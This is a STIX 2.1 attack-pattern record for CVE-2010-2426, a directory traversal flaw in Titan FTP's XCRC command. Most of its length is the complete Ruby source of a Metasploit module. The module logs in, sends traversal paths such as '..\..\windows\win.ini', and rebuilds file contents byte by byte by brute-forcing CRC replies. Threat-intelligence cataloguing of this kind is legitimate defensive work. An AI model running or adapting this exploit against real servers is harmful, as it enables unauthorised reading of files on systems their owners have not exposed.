{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--edc8bef8-c75c-493a-9a22-24cb92cd84b2",
    "created": "2024-08-14T16:28:15.552343Z",
    "modified": "2024-08-14T16:28:15.552346Z",
    "name": "Titan FTP XCRC Directory Traversal Information Disclosure",
    "description": " This module exploits a directory traversal vulnerability in the XCRC command implemented in versions of Titan FTP up to and including 8.10.1125. By making sending multiple XCRC command, it is possible to disclose the contents of any file on the drive with a simple CRC \"brute force\" attack.  Although the daemon runs with SYSTEM privileges, access is limited to files that reside on the same drive as the FTP server's root directory. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/ftp/titanftp_xcrc_traversal.rb",
            "external_id": "titanftp_xcrc_traversal.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-2426"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/bugtraq/2010/Jun/160"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Ftp\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def proto\n    'ftp'\n  end\n\n  def initialize\n    super(\n      'Name'           => 'Titan FTP XCRC Directory Traversal Information Disclosure',\n      'Description'    => %q{\n          This module exploits a directory traversal vulnerability in the XCRC command\n        implemented in versions of Titan FTP up to and including 8.10.1125. By making\n        sending multiple XCRC command, it is possible to disclose the contents of any\n        file on the drive with a simple CRC \"brute force\" attack.\n\n        Although the daemon runs with SYSTEM privileges, access is limited to files\n        that reside on the same drive as the FTP server's root directory.\n      },\n      'Author'         =>\n        [\n          'jduck',\n          'Brandon McCann @zeknox <bmccann[at]accuvant.com>',\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2010-2426' ],\n          [ 'OSVDB', '65533'],\n          [ 'URL', 'https://seclists.org/bugtraq/2010/Jun/160' ]\n        ],\n      'DisclosureDate' => 'Jun 15 2010'\n    )\n\n    register_options(\n      [\n        Opt::RPORT(21),\n        OptString.new('TRAVERSAL', [ true, \"String to traverse to the drive's root directory\", \"..\\\\..\\\\\" ]),\n        OptString.new('PATH', [ true, \"Path to the file to disclose, relative to the root dir.\", 'windows\\\\win.ini'])\n      ])\n  end\n\n\n  def run_host(ip)\n\n    c = connect_login\n    return if not c\n\n    path = datastore['TRAVERSAL'] + datastore['PATH']\n\n    res = send_cmd( ['XCRC', path, \"0\", \"9999999999\"], true )\n    if not (res =~ /501 Syntax error in parameters or arguments\\. EndPos of 9999999999 is larger than file size (.*)\\./)\n      print_error(\"Unable to obtain file size! File probably doesn't exist.\")\n      return\n    end\n    file_size = $1.to_i\n\n    update_interval = 1.5\n    last_update = Time.now - update_interval\n\n    old_crc = 0\n    file_data = ''\n    file_size.times { |off|\n      res = send_cmd( ['XCRC', path, \"0\", (off+1).to_s], true )\n      if not (res =~ /250 (.*)\\r?\\n/)\n        raise RuntimeError, \"Unable to obtain XCRC of byte #{off}!\"\n      end\n\n      crc = $1.to_i(16)\n      if (crc == 0)\n        raise RuntimeError, \"Unable to decode CRC: #{$1}\"\n      end\n\n      ch = char_from_crc(crc, old_crc)\n      if not (ch)\n        raise RuntimeError, (\"Unable to find a CRC match for 0x%x\" % crc)\n      end\n\n      # got this byte ;)\n      file_data << ch\n      old_crc = crc\n\n      if (Time.now - last_update) >= update_interval\n        progress(file_size, off)\n        last_update = Time.now\n      end\n    }\n\n    progress(file_size, file_size)\n\n    fname = datastore['PATH'].gsub(/[\\/\\\\]/, '_')\n    p = store_loot(\"titanftp.traversal\", \"text/plain\", ip, file_data, fname)\n    print_good(\"Saved in: #{p}\")\n    vprint_status(file_data.inspect)\n\n    disconnect\n\n  end\n\n  #\n  # Return a character code from the crc, or nil on failure\n  #\n  def char_from_crc(crc, old_crc)\n    256.times { |x|\n      ch = x.chr\n      if (Zlib.crc32(ch, old_crc) == crc)\n        return ch\n      end\n    }\n    nil\n  end\n\n  def progress(total, current)\n    done = (current.to_f / total.to_f) * 100\n    percent = \"%3.2f%%\" % done.to_f\n    print_status(\"Obtaining file contents - %7s done (%d/%d bytes)\" % [percent, current, total])\n  end\nend\n",
    "x_mitre_disclosure_date": "Jun 15 2010"
}